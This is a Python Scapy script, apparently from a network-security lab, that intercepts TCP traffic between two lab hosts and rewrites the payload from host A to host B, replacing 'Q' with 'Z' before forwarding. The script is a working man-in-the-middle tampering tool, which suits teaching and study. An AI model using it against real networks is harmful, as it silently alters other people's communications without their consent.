#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"
MAC_A = "02:42:0a:09:00:05"
MAC_B = "02:42:0a:09:00:06"
MAC_M = "02:42:0a:09:00:69"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt.haslayer(TCP):
        # Create new packet
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            # Replace 'Q' with 'Z' (case sensitive)
            if b'Q' in data:
                newdata = data.replace(b'Q', b'Z')
                print(f"Replaced Q with Z in packet {pkt.summary()}")
                send(newpkt/newdata)
            else:
                send(newpkt)
        else:
            send(newpkt)
            
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A and pkt.haslayer(TCP):
        # Forward packets from B to A unchanged
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

# Filter to exclude our own generated packets
f = f'tcp and (ether src {MAC_A} or ether src {MAC_B}) and not ether src {MAC_M}'
sniff(iface='eth0', filter=f, prn=spoof_pkt)
